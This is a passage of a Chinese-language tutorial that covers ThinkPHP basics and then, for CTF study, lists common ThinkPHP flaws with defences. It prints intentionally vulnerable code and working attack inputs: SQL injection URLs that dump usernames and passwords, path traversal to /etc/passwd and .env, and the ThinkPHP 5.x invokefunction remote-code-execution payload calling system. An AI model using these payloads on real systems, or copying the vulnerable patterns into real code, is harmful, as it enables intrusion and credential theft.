class_">app</span>\<span class="hljs-title class_">controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, ThinkPHP!&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;World&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, &#x27;</span> . <span class="hljs-variable">$name</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>访问控制器：<ul><li>访问 <code>http://localhost/index.php/index/index</code> 将会输出 <code>Hello, ThinkPHP!</code>。</li><li>访问 <code>http://localhost/index.php/index/hello/name/ThinkPHP</code> 将会输出 <code>Hello, ThinkPHP!</code>。</li></ul></li></ol><hr><h4 id="配置路由"><a href="#配置路由" class="headerlink" title="配置路由"></a>配置路由</h4><p>路由定义了 URL 与控制器&#x2F;方法的映射关系。ThinkPHP 的路由配置文件位于 <code>route/route.php</code>。</p><ol><li>配置路由文件 <code>route/route.php</code>，定义路由规则：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Route</span>;<br><br><span class="hljs-comment">// 定义一个 GET 路由</span><br><span class="hljs-title class_">Route</span>::<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;hello/:name&#x27;</span>, <span class="hljs-string">&#x27;index/hello&#x27;</span>);<br></code></pre></td></tr></table></figure><ol start="2"><li>访问 <code>http://localhost/hello/ThinkPHP</code> 将会调用 <code>IndexController</code> 中的 <code>hello</code> 方法，并返回 <code>Hello, ThinkPHP</code>。</li></ol><hr><h3 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h3><p>ThinkPHP 提供了强大的 ORM 功能，方便与数据库交互。在开始数据库操作前，首先需要配置数据库连接。</p><h4 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h4><ol><li>配置数据库连接信息，修改 <code>config/database.php</code> 文件：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">return</span> [<br>    <span class="hljs-comment">// 数据库类型</span><br>    <span class="hljs-string">&#x27;type&#x27;</span>        =&gt; <span class="hljs-string">&#x27;mysql&#x27;</span>,<br>    <span class="hljs-comment">// 服务器地址</span><br>    <span class="hljs-string">&#x27;hostname&#x27;</span>    =&gt; <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>    <span class="hljs-comment">// 数据库名</span><br>    <span class="hljs-string">&#x27;database&#x27;</span>    =&gt; <span class="hljs-string">&#x27;thinkphp&#x27;</span>,<br>    <span class="hljs-comment">// 用户名</span><br>    <span class="hljs-string">&#x27;username&#x27;</span>    =&gt; <span class="hljs-string">&#x27;root&#x27;</span>,<br>    <span class="hljs-comment">// 密码</span><br>    <span class="hljs-string">&#x27;password&#x27;</span>    =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-comment">// 端口</span><br>    <span class="hljs-string">&#x27;hostport&#x27;</span>    =&gt; <span class="hljs-string">&#x27;3306&#x27;</span>,<br>];<br></code></pre></td></tr></table></figure><hr><h4 id="创建模型"><a href="#创建模型" class="headerlink" title="创建模型"></a>创建模型</h4><p>模型对应数据库表，处理数据的增删改查操作。默认情况下，模型名对应数据库表名（小写）。</p><ol><li>在 <code>application/model/</code> 目录下创建模型文件 <code>User.php</code>：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> application/model/User.php<br></code></pre></td></tr></table></figure><ol start="2"><li>编写模型类代码：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">model</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">// 指定数据库表名</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;user&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>在控制器中使用模型进行数据查询：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">app</span>\<span class="hljs-title">model</span>\<span class="hljs-title">User</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getUser</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 查询 ID 为 1 的用户</span><br>    <span class="hljs-variable">$user</span> = <span class="hljs-title class_">User</span>::<span class="hljs-title function_ invoke__">find</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>(<span class="hljs-variable">$user</span>);<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="视图和模板"><a href="#视图和模板" class="headerlink" title="视图和模板"></a>视图和模板</h3><p>视图负责显示数据，通常由 HTML 模板组成。视图文件存放在 <code>application/view/</code> 目录下，模板文件的命名需与控制器和方法名一致。</p><h4 id="创建视图文件"><a href="#创建视图文件" class="headerlink" title="创建视图文件"></a>创建视图文件</h4><ol><li>在 <code>application/view/index/</code> 目录下创建视图文件 <code>index.html</code>：</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>ThinkPHP<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, &#123;$name&#125;!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="渲染视图"><a href="#渲染视图" class="headerlink" title="渲染视图"></a>渲染视图</h4><p>控制器可以通过 <code>view()</code> 方法渲染视图文件，并传递数据到视图。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;ThinkPHP&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">view</span>(<span class="hljs-string">&#x27;index&#x27;</span>, [<span class="hljs-string">&#x27;name&#x27;</span> =&gt; <span class="hljs-variable">$name</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>访问 <code>http://localhost/index/index</code> 时，将显示 <code>Hello, ThinkPHP!</code>。</p><hr><h3 id="表单验证"><a href="#表单验证" class="headerlink" title="表单验证"></a>表单验证</h3><p>表单验证用于验证用户输入的数据，确保其合法性。ThinkPHP 提供了强大的验证机制。</p><h4 id="创建验证器"><a href="#创建验证器" class="headerlink" title="创建验证器"></a>创建验证器</h4><ol><li>在 <code>application/validate/</code> 目录下创建验证器文件 <code>User.php</code>：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">validate</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Validate</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Validate</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">// 定义验证规则</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$rule</span> = [<br>        <span class="hljs-string">&#x27;name&#x27;</span>  =&gt; <span class="hljs-string">&#x27;require|max:25&#x27;</span>,<br>        <span class="hljs-string">&#x27;email&#x27;</span> =&gt; <span class="hljs-string">&#x27;email&#x27;</span>,<br>    ];<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="使用验证器"><a href="#使用验证器" class="headerlink" title="使用验证器"></a>使用验证器</h4><p>在控制器中使用验证器来验证用户输入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">app</span>\<span class="hljs-title">validate</span>\<span class="hljs-title">User</span> <span class="hljs-keyword">as</span> <span class="hljs-title">UserValidate</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">saveUser</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$data</span> = [<br>        <span class="hljs-string">&#x27;name&#x27;</span>  =&gt; <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&#x27;post.name&#x27;</span>),<br>        <span class="hljs-string">&#x27;email&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&#x27;post.email&#x27;</span>),<br>    ];<br><br>    <span class="hljs-variable">$validate</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserValidate</span>();<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$validate</span>-&gt;<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$data</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$validate</span>-&gt;<span class="hljs-title function_ invoke__">getError</span>();  <span class="hljs-comment">// 返回验证错误</span><br>    &#125;<br><br>    <span class="hljs-comment">// 验证通过后执行其他操作</span><br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="错误和日志"><a href="#错误和日志" class="headerlink" title="错误和日志"></a>错误和日志</h3><p>ThinkPHP 提供了简单的错误处理机制，并支持日志记录。</p><h4 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h4><ol><li>自定义错误页面：可以在配置文件中自定义异常处理模板：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// config/app.php</span><br><span class="hljs-string">&#x27;exception_tmpl&#x27;</span> =&gt; \think\facade<span class="hljs-title class_">\App</span>::<span class="hljs-title function_ invoke__">getAppPath</span>() . <span class="hljs-string">&#x27;view/error.html&#x27;</span>,<br></code></pre></td></tr></table></figure><ol start="2"><li>定义自定义的错误页面 <code>application/view/error.html</code>：</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Error<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>An error occurred<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>&#123;$message&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="日志记录"><a href="#日志记录" class="headerlink" title="日志记录"></a>日志记录</h4><p>日志记录可以帮助开发者跟踪系统中的异常与调试信息。日志文件保存在 <code>runtime/log/</code> 目录中。</p><ol><li>在控制器中记录日志：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">facade</span>\<span class="hljs-title">Log</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title class_">Log</span>::<span class="hljs-title function_ invoke__">record</span>(<span class="hljs-string">&#x27;这是一个调试信息&#x27;</span>, <span class="hljs-string">&#x27;debug&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;日志已记录&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>查看日志：日志文件会保存在 <code>runtime/log/</code> 目录下。</li></ol><hr><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><h4 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h4><p>在部署之前，确保配置好不同的环境参数，比如数据库连接、调试模式等。</p><ol><li>修改 <code>.env</code> 文件，配置生产环境参数：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs env">APP_DEBUG = false<br>DB_HOST = 127.0.0.1<br>DB_NAME = production_db<br>DB_USER = prod_user<br>DB_PASS = prod_pass<br></code></pre></td></tr></table></figure><h4 id="配置-Web-服务器"><a href="#配置-Web-服务器" class="headerlink" title="配置 Web 服务器"></a>配置 Web 服务器</h4><p>ThinkPHP 项目需要部署在 Web 服务器上，如 <strong>Apache</strong> 或 <strong>Nginx</strong>。</p><p><strong>Nginx 配置示例</strong>：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span> yourdomain.com<br></code></pre></td></tr></table></figure><h3 id="ThinkPHP-框架架构与基础概念"><a href="#ThinkPHP-框架架构与基础概念" class="headerlink" title="ThinkPHP 框架架构与基础概念"></a>ThinkPHP 框架架构与基础概念</h3><p>ThinkPHP 是一个基于 MVC（Model-View-Controller）模式的 PHP 框架。其核心概念如下：</p><ul><li><strong>Model（模型）</strong>：负责与数据库交互，执行数据的增删改查操作。</li><li><strong>View（视图）</strong>：负责展示数据，并将结果输出给用户。</li><li><strong>Controller（控制器）</strong>：负责逻辑处理，协调模型和视图的交互。</li></ul><h4 id="1-路由机制"><a href="#1-路由机制" class="headerlink" title="1. 路由机制"></a>1. 路由机制</h4><p>ThinkPHP 的路由机制决定了 URL 如何映射到具体的控制器和操作。默认情况下，ThinkPHP 通过 URL 的路径结构来决定加载哪个控制器和方法。例如，<code>index.php?m=module&amp;a=action</code> 将会调用 <code>module</code> 模块下的 <code>action</code> 方法。</p><p>如果不当处理 URL 及其参数，可能会导致路径遍历、SQL 注入和远程代码执行等安全问题。</p><hr><h3 id="ThinkPHP-常见的安全漏洞"><a href="#ThinkPHP-常见的安全漏洞" class="headerlink" title="ThinkPHP 常见的安全漏洞"></a>ThinkPHP 常见的安全漏洞</h3><p>在 CTF 比赛中，ThinkPHP 的漏洞主要集中在以下几个方面：</p><h4 id="1-SQL-注入漏洞"><a href="#1-SQL-注入漏洞" class="headerlink" title="1.SQL 注入漏洞"></a>1.SQL 注入漏洞</h4><p>SQL 注入是指攻击者通过构造恶意的输入，破坏应用程序执行的 SQL 查询。虽然 ThinkPHP 提供了 ORM 和预处理机制，避免直接拼接 SQL 语句，但是如果开发者直接使用原生 SQL 查询且未做适当的过滤，则可能会引发 SQL 注入。</p><p><strong>漏洞示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 不安全的 SQL 查询</span><br><span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">M</span>(<span class="hljs-string">&#x27;User&#x27;</span>);<br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;SELECT * FROM users WHERE id = &quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>在上述代码中，<code>$_GET[&#39;id&#39;]</code> 的值未经过滤就被插入到了 SQL 查询中，攻击者可以通过构造如下 URL 进行 SQL 注入：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">index.php?<span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">OR</span> <span class="hljs-attribute">1</span>=1 --<br></code></pre></td></tr></table></figure><p><strong>修复方法</strong>：</p><ul><li>使用框架提供的 ORM：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])-&gt;<span class="hljs-title function_ invoke__">select</span>();<br></code></pre></td></tr></table></figure></li><li>或者使用 PDO 进行参数化查询，避免 SQL 注入。</li></ul><h4 id="2-路径遍历漏洞"><a href="#2-路径遍历漏洞" class="headerlink" title="2.路径遍历漏洞"></a>2.路径遍历漏洞</h4><p>路径遍历是指攻击者通过操纵文件路径的输入，访问服务器上未经授权的文件。ThinkPHP 的路由机制在处理不当输入时，可能导致文件包含和路径遍历漏洞。</p><p><strong>漏洞示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 不安全的文件加载</span><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] . <span class="hljs-string">&#x27;.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p>攻击者可以通过构造如下 URL 来读取系统的敏感文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?page=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure><p><strong>防御措施</strong>：</p><ul><li>严格限制输入的文件路径，使用 <code>realpath()</code> 等函数校验路径是否合法。</li><li>使用白名单机制，只允许加载特定的文件。</li></ul><h4 id="3-远程代码执行（RCE）"><a href="#3-远程代码执行（RCE）" class="headerlink" title="3 .远程代码执行（RCE）"></a>3 .远程代码执行（RCE）</h4><p>ThinkPHP 的某些版本存在远程代码执行漏洞，允许攻击者通过构造恶意请求执行任意代码。在 ThinkPHP 5.x 系列中，某些版本允许调用 PHP 函数，攻击者可以通过调用 <code>call_user_func_array</code> 等函数来执行操作系统命令。</p><p><strong>漏洞示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">index.php?s=index/\think\app/invokefunction&amp;<span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">call_user_func_array</span>&amp;<span class="hljs-title">vars</span>[0]=<span class="hljs-title">system</span>&amp;<span class="hljs-title">vars</span>[1][]=<span class="hljs-title">whoami</span></span><br></code></pre></td></tr></table></figure><p>该漏洞利用框架的内部调用机制，调用 <code>system</code> 函数执行命令 <code>whoami</code>，返回服务器的用户信息。</p><h5 id="受影响版本："><a href="#受影响版本：" class="headerlink" title="受影响版本："></a>受影响版本：</h5><ul><li>ThinkPHP 5.0.23 及其之前版本</li><li>ThinkPHP 5.1.31 及其之前版本</li></ul><p><strong>防御措施</strong>：</p><ul><li>更新至最新的安全版本，及时修补已知漏洞。</li><li>对所有用户输入进行严格过滤，特别是与函数调用相关的输入。</li><li>禁止通过 URL 直接调用敏感的 PHP 函数，如 <code>eval</code>、<code>system</code>。</li></ul><h4 id="4-反序列化漏洞"><a href="#4-反序列化漏洞" class="headerlink" title="4 .反序列化漏洞"></a>4 .反序列化漏洞</h4><p>反序列化漏洞通常出现在使用序列化机制存储或传递数据的场景中。如果用户提供的数据未经验证就被反序列化，攻击者可以构造恶意的序列化数据，实现任意代码执行。</p><p><strong>漏洞示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 不安全的反序列化操作</span><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>攻击者可以传递恶意的序列化数据：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;A&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;exec&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>通过该漏洞，攻击者可以利用反序列化后的对象实现代码执行。</p><p><strong>防御措施</strong>：</p><ul><li>避免直接反序列化不可信的数据。</li><li>使用安全的序列化和反序列化方法，如 JSON 编码和解码。</li><li>如果必须使用 PHP 的反序列化机制，建议对输入数据进行严格校验。</li></ul><hr><h3 id="ThinkPHP-漏洞利用方法"><a href="#ThinkPHP-漏洞利用方法" class="headerlink" title="ThinkPHP 漏洞利用方法"></a>ThinkPHP 漏洞利用方法</h3><p>在 CTF 比赛中，ThinkPHP 相关题目通常会包含 SQL 注入、路径遍历、反序列化和 RCE 漏洞。以下是几种常见的漏洞利用方式：</p><h4 id="1-SQL-注入攻击"><a href="#1-SQL-注入攻击" class="headerlink" title="1. SQL 注入攻击"></a>1. SQL 注入攻击</h4><p>通过在 URL 或表单中注入恶意的 SQL 语句，攻击者可以操控查询结果。</p><ul><li>示例攻击 URL：<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>.php?id=<span class="hljs-number">1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> username, <span class="hljs-keyword">password</span> <span class="hljs-keyword">FROM</span> users<br></code></pre></td></tr></table></figure></li></ul><p>此时，攻击者可以获得数据库中用户的用户名和密码。</p><h4 id="2-远程代码执行攻击"><a href="#2-远程代码执行攻击" class="headerlink" title="2. 远程代码执行攻击"></a>2. 远程代码执行攻击</h4><p>针对 ThinkPHP 5.x 中的 RCE 漏洞，可以构造如下 URL 来执行系统命令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">index.php?s=index/\think\app/invokefunction&amp;<span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">call_user_func_array</span>&amp;<span class="hljs-title">vars</span>[0]=<span class="hljs-title">system</span>&amp;<span class="hljs-title">vars</span>[1][]=<span class="hljs-title">id</span></span><br></code></pre></td></tr></table></figure><p>可以将 <code>system</code> 替换为其他函数，如 <code>exec</code>、<code>shell_exec</code> 等，执行不同的命令。</p><h4 id="3-路径遍历攻击"><a href="#3-路径遍历攻击" class="headerlink" title="3.路径遍历攻击"></a>3.路径遍历攻击</h4><p>攻击者通过路径遍历漏洞，获取系统中的敏感文件或配置文件。例如，访问 <code>.env</code> 文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">index.php?s=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>config/.env<br></code></pre></td></tr></table></figure><p>这种攻击可能泄露数据库连接信息，进一步导致更严重的后果。</p><h4 id="4-反序列化攻击"><a href="#4-反序列化攻击" class="headerlink" title="4. 反序列化攻击"></a>4. 反序列化攻击</h4><p>攻击者可以构造恶意的序列化数据，利用反序列化漏洞进行攻击。可以通过发送特定的 POST 请求来传递恶意的对象数据，并实现代码执行。</p><hr><h3 id="ThinkPHP-安全防御措施"><a href="#ThinkPHP-安全防御措施" class="headerlink" title="ThinkPHP 安全防御措施"></a>ThinkPHP 安全防御措施</h3><p>为防止 ThinkPHP 应用程序被攻击，可以采取以下防御措施：</p><ol><li><p><strong>及时更新框架</strong>：保持 ThinkPHP 框架的最新版本，修补已知漏洞。尤其是存在远程代码执行漏洞的 ThinkPHP 5.x 系列，建议及时更新至最新版本。</p></li><li><p><strong>输入过滤</strong>：对所有用户输入进行严格的过滤和校验，尤其是 URL 参数和 POST 数据，防止注入和路径遍历攻击。</p></li><li><p><strong>使用 ORM 或参数化查询</strong>：避免直接拼接 SQL 查询，使用框架的 ORM 或者 PDO 提供的参数化查询功能，防止 SQL 注入。</p></li><li><p><strong>关闭调试模式</strong>：生产环境中应关闭调试模式，防止暴露敏感的调试信息。可以通过修改配置文件中的 <code>APP_DEBUG</code> 设置关闭调试。</p></li><li><p><strong>使用 Web 应用防火墙（WAF）</strong>：在服务器前端部署 WAF，防止常见的 Web 攻击，如 SQL 注入、XSS 和 RCE 等。</p></li><li><p><strong>路径安全</strong>：对于文件路径操作，使用 <code>realpath()</code> 